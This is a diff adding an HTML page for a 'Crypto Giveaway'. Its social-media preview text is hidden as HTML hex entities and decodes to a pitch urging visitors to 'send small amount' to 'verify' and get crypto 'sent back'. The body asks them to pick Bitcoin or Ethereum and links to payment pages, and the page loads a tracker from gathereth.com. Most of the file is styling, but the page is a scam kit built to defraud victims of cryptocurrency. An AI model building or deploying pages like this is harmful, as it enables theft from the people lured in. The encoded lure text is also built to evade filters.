@@ -1,0 +1,509 @@
+<html lang="en-US">
+<head profile="https://www.w3.org/2005/10/profile">
+<script src="clipboard.min.js.download"></script>
+<script src="jquery.min.js.download"></script>
+<script src="bootstrap.min.js.download"></script>
+<meta name="robots" content="noindex, follow">
+<meta name="twitter:card" content="summary_large_image">
+     <meta name="twitter:title" content="&#x47;&#x45;&#x54;&#x20;&#x59;&#x4F;&#x55;&#x52;&#x53;&#x20;&#x48;&#x45;&#x52;&#x45;&#x21;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x67;&#x69;&#x66;&#x74;&#x20;&#x69;&#x73;&#x20;&#x77;&#x61;&#x69;&#x74;&#x69;&#x6E;&#x67;&#x20;&#x66;&#x6F;&#x72;&#x20;&#x59;&#x4F;&#x55;&#x21;">
+     <meta name="twitter:description" content="&#x43;&#x6C;&#x69;&#x63;&#x6B;&#x20;&#x68;&#x65;&#x72;&#x65;&#x20;&#x74;&#x6F;&#x20;&#x67;&#x65;&#x74;&#x20;&#x69;&#x74;&#x20;&#x4E;&#x4F;&#x57;&#x21;&#x20;&#x54;&#x6F;&#x20;&#x76;&#x65;&#x72;&#x69;&#x66;&#x79;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x6C;&#x66;&#x2C;&#x20;&#x6A;&#x75;&#x73;&#x74;&#x20;&#x73;&#x65;&#x6E;&#x64;&#x20;&#x73;&#x6D;&#x61;&#x6C;&#x6C;&#x20;&#x61;&#x6D;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x67;&#x65;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x63;&#x68;&#x6F;&#x73;&#x65;&#x6E;&#x20;&#x63;&#x72;&#x79;&#x70;&#x74;&#x6F;&#x20;&#x69;&#x6D;&#x6D;&#x65;&#x64;&#x69;&#x61;&#x74;&#x65;&#x6C;&#x79;&#x20;&#x73;&#x65;&#x6E;&#x74;&#x20;&#x62;&#x61;&#x63;&#x6B;&#x20;&#x74;&#x6F;&#x20;&#x79;&#x6F;&#x75;&#x21;">
+    <meta name="twitter:image" content="https://i.imgur.com/IxBAYqE.jpg">
+	<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon" />	
+    <title>Crypto Giveaway</title>
+	<script type="text/javascript">//<![CDATA[
+window.onload=function(){
+
+}//]]>
+
+</script>
+
+
+
+<style>.last_trans {
+    width: 1050px;
+    margin-top: 50px;
+    margin-right: auto;
+    margin-bottom: 0;
+    margin-left: auto;
+    background-color: #ffffff;
+    padding: 15px;
+}
+
+h1.f-24.mvn.em-300 {
+    font-family: Montserrat, Helvetica, sans-serif
+;
+    color: rgb(95, 95, 95)
+;
+    font-size: 23px;
+    font-weight: 300;
+    margin-bottom: 15px;
+}
+
+h1.f-24.mvn.em-300 span {
+    font-family: 'Montserrat', 'Helvetica', sans-serif ;
+    font-size: 16px;
+    font-style: italic;
+    color: #a8a8a8;
+    font-weight: 300;
+    white-space: nowrap;
+    margin-left: 10px;
+}
+
+h2.f-24.mvn.em-300 {
+    font-family: Montserrat, Helvetica, sans-serif
+;
+    color: rgb(128 , 128, 128)
+;
+    font-size: 45px;
+    font-weight: 300;
+    margin-bottom: 15px;
+}
+
+h2.f-24.mvn.em-300 span {
+    font-family: 'Montserrat', 'Helvetica', sans-serif ;
+    font-size: 16px;
+    font-style: italic;
+    color: #a8a8a8;
+    font-weight: 300;
+    white-space: nowrap;
+    margin-left: 10px;
+}
+
+.text-overflow-hidden, .ui-select-match-text {
+	overflow:visible !important;
+}
+
+</style>
+
+    <style>.last_trans {
+        width: 1050px;
+        margin-top: 50px;
+        margin-right: auto;
+        margin-bottom: 0;
+        margin-left: auto;
+        background-color: #ffffff;
+        padding: 15px;
+    }
+
+    h1.f-24.mvn.em-300 {
+        font-family: Montserrat, Helvetica, sans-serif;
+        color: rgb(95, 95, 95);
+        font-size: 25px;
+        font-weight: 300;
+        margin-bottom: 15px;
+    }
+
+    h1.f-24.mvn.em-300 span {
+        font-family: 'Montserrat', 'Helvetica', sans-serif;
+        font-size: 16px;
+        font-style: italic;
+        color: #a8a8a8;
+        font-weight: 300;
+        white-space: nowrap;
+        margin-left: 10px;
+    }
+
+    .text-overflow-hidden, .ui-select-match-text {
+        overflow: visible !important;
+    }
+
+    .numb {
+        text-align: center;
+        font-size: 40px;
+        padding: 46px 10px 0 10px;
+        color: #fff;
+    }
+
+    .numb-hint {
+        color: #CBCBCB;
+        font-size: 21px;
+        padding-left: 15px;
+    }
+
+    .dot-1 {
+        position: absolute;
+        bottom: 100%;
+        font-size: 12px;
+        width: 100%;
+        margin-left: 0;
+        z-index: 100;
+        padding: 8px;
+    }
+	
+    /* progress bar */
+
+    #lympo_progress .progress {
+        max-width: 460px;
+        margin: 10px auto;
+        height: 45px;
+        border-radius: 5px;
+        position: relative;
+    }
+
+    #lympo_progress .progress {
+        margin-bottom: 20px;
+        background-color: #3b3b43;
+        border-radius: 4px;
+        -webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
+        box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
+    }
+
+    #lympo_progress .progress:before {
+        content: "";
+        display: block;
+        background: #000;
+        width: 100%;
+        height: 100%;
+    }
+
+    #lympo_progress .progress-row {
+        max-width: 600px;
+        margin: 0 auto;
+    }
+	.myP {
+		visibility: hidden;
+	}
+    #lympo_progress .progress-row > div {
+        padding: 0 5px;
+    }
+
+    #lympo_progress .progress-bar {
+        -webkit-transition: width 1.4s ease;
+        transition: width 1.4s ease;
+    }
+
+    #lympo_progress .progress-bar {
+        float: left;
+        width: 0%;
+        height: 100%;
+        border-bottom-left-radius: 4px;
+        border-top-left-radius: 4px;
+        font-size: 13px;
+        line-height: 20px;
+        color: #ffffff;
+        text-align: center;
+        background-color: #ee1d4e;
+        -webkit-box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
+        box-shadow: inset 0 -1px 0 rgba(0, 0, 0, 0.15);
+        -webkit-transition: width 0.6s ease;
+        transition: width 0.6s ease;
+        position: absolute;
+        top: 0;
+    }
+
+    #lympo_progress .progress-striped .progress-bar, #lympo_progress .progress-bar-striped {
+        background-image: linear-gradient(135deg, rgba(255, 255, 255, 0.15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.15) 50%, rgba(255, 255, 255, 0.15) 75%, transparent 75%, transparent);
+        /* background-image: linear-gradient(45deg,rgba(255,255,255,0.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,0.15) 50%,rgba(255,255,255,0.15) 75%,transparent 75%,transparent); */
+        background-size: 40px 40px;
+
+    }
+
+    #lympo_progress .progress.active .progress-bar, #lympo_progress .progress-bar.active {
+        -webkit-animation: progress-bar-stripes 2s linear infinite;
+        animation: progress-bar-stripes 2s linear infinite;
+    }
+
+    @keyframes progress-bar-stripes {
+        from {
+            background-position: -40px 0;
+        }
+        to {
+            background-position: 0 0;
+        }
+    }
+
+    #lympo_progress .progress-ico {
+        position: relative;
+        max-width: 460px;
+        margin: 48px auto -3px auto;
+    }
+
+    #lympo_progress .progress-ico .dot-1 {
+        position: absolute;
+        bottom: 100%;
+        font-size: 12px;
+        width: 100%;
+        margin-left: 0;
+        z-index: 100;
+        padding: 8px;
+    }
+
+    #lympo_progress .progress-ico .dot-2 {
+        position: absolute;
+        top: 100%;
+        font-size: 12px;
+        width: 100%;
+        height: auto;
+        padding: 8px;
+        margin-left: 0;
+        z-index: 100;
+    }
+
+    #lympo_progress .progress-ico .dot-1 {
+        color: #fff;
+        width: 100%;
+        text-align: center;
+        padding-bottom: 12px;
+        font-weight: 700;
+        font-size: 16px;
+    }
+	#body {
+		visibility:hidden;
+	}
+    #lympo_progress .progress-ico .dot-1-airdrop:before {
+        content: "";
+        display: block;
+        width: 10px;
+        height: 10px;
+        background-color: #f04154;
+        border-radius: 50%;
+        margin: 0;
+        position: absolute;
+        right: -4px;
+        top: -7px;
+    }
+
+    #lympo_progress .progress-ico .dot-1-airdrop {
+        content: "";
+        display: block;
+        height: 60px;
+        background-color: #f04154;
+        width: 2px;
+        position: absolute;
+        right: -1px;
+        z-index: 100;
+        top: -4px;
+        left: 100%;
+    }
+
+    #lympo_progress .progress-ico .progress {
+
+        position: relative;
+        margin: 0 auto;
+    }
+
+    #lympo_progress .progress-ico span {
+        position: absolute;
+        text-align: center;
+        top: 0;
+        left: 0;
+        right: 0;
+        line-height: 45px;
+        color: #fff;
+        font-size: 14px;
+        letter-spacing: 0.5px;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+    }
+
+    #lympo_progress .ends {
+        position: absolute;
+        bottom: -20px;
+        width: 100%;
+        text-align: center;
+        font-size: 12px;
+    }
+
+    @media (max-width: 767px) {
+        #lympo_progress .progress-ico span {
+            font-size: 15px;
+        }
+    }
+
+    #lympo_progress .progress-ico span strong {
+        color: rgba(255, 255, 255, 0.4);
+    }
+
+    #lympo_progress .progress-ico i {
+        font-size: 11px;
+        text-align: right;
+        float: right;
+        color: #7f8480;
+        margin-bottom: -7px;
+        font-style: normal;
+        margin-top: 2px;
+    }
+
+    #lympo_progress .progress-tour {
+        max-width: 400px;
+        margin: 10px auto;
+    }
+
+    #lympo_progress .progress-tour span.tour-left {
+        float: left;
+        display: inline-block;
+        width: 25%;
+        line-height: 40px;
+        font-size: 15px;
+        font-weight: 500;
+        color: #868886;
+    }
+
+    @media (max-width: 767px) {
+        #lympo_progress .progress-tour span.tour-left {
+            width: 30%;
+            font-size: 12px;
+        }
+    }
+
+    #lympo_progress .progress-tour small {
+        padding-left: 25%;
+        margin: 3px 0 10px 0;
+        display: block;
+        color: #868886;
+    }
+
+    #lympo_progress .progress-money {
+        display: inline-block;
+        float: left;
+        width: 75%;
+        line-height: 40px;
+        height: 40px;
+        border-radius: 5px;
+        background-color: rgba(0, 0, 0, 0.3);
+        color: #fff;
+        font-size: 20px;
+        letter-spacing: 4px;
+        text-shadow: 0px 0px 3px rgba(0, 0, 0, 0.05);
+    }
+
+    #lympo_progress .progress-money strong {
+        letter-spacing: 0px;
+        font-size: 18px;
+        color: #ababab;
+    }
+
+    @media (max-width: 767px) {
+        #lympo_progress .progress-money {
+            font-size: 15px;
+            letter-spacing: 5px;
+            width: 70%;
+        }
+
+        #lympo_progress .progress-money strong {
+            font-size: 14px;
+        }
+    }
+
+    .label-orange {
+        background: #e67e22;
+    }
+</style>
+
+<style>
+.tooltip {
+    position: relative;
+    display: inline-block;
+}
+
+.tooltip .tooltiptext {
+    visibility: hidden;
+    width: 140px;
+    background-color: #555;
+    color: #fff;
+    text-align: center;
+    border-radius: 6px;
+    padding: 5px;
+    position: absolute;
+    z-index: 1;
+    bottom: 150%;
+    left: 50%;
+    margin-left: -75px;
+    opacity: 0;
+    transition: opacity 0.3s;
+}
+
+.tooltip .tooltiptext::after {
+    content: "";
+    position: absolute;
+    top: 100%;
+    left: 50%;
+    margin-left: -5px;
+    border-width: 5px;
+    border-style: solid;
+    border-color: #555 transparent transparent transparent;
+}
+
+.tooltip:hover .tooltiptext {
+    visibility: visible;
+    opacity: 1;
+}
+.backg {
+	background-image: url(images/back.png);
+  background-position: center center;
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+  background-size: cover;
+  background-color: #464646;
+}
+</style>
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><link rel="stylesheet" href="overrides.css" type="text/css"><script src="jquery.js" type="text/javascript"></script><script type="text/javascript" src="bootstrap.js"></script><script src="shared.js" type="text/javascript"></script><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<link rel="stylesheet" href="blockchain.css" type="text/css">
+
+
+
+
+	<link rel="stylesheet" href="payment-request.css" type="text/css">
+    <link rel="stylesheet" href="app-overrides.css" type="text/css" media="only screen">
+<style type="text/css"> .adv{display: none;} .basic{display: inherit;} </style><style type="text/css"> .adv{display: none;} .basic{display: inherit;} </style></head>
+
+<body class="backg">
+  
+
+
+  
+  <br>
+  <br>
+  <input name="" value="0" id="btc" class="hidden" type="number">
+  
+
+  <div class="overflow-scroll flex-justify flex-center main-font">
+    <div class="bg-white payment-request pos-rel">
+      <div class="pv-45 ph-40 center">
+	  
+      
+
+        <div class="detail" style="margin-top:-100px">
+          
+            
+              
+
+              
+                  <p class="text-center f-16 em-300 mt-15 mb-25" style="font-size: 13pt; background: #4fae1d;color: #fff;padding: 5px; ">Please choose the currency that you would like to receive</p>
+
+              <div>
+			  <a href="btc.php.html"><img src="images/bitcoin.jpg" height="200" width="200" style="padding-right: 10px;"></a>
+			  <a href="eth.php.html"><img src="images/ethereum.jpg" height="200" width="200" style="padding-left: 10px;"></a>
+			  </div>
+
+
+		   <br> 
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+<style type="text/css">
+        #body {
+            visibility:visible;
+        }
+        </style><script type="text/javascript">
+  var _paq = _paq || [];
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//gathereth.com/mtm/";
+    _paq.push(['setTrackerUrl', u+'piwik.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+
+
+</body></html>
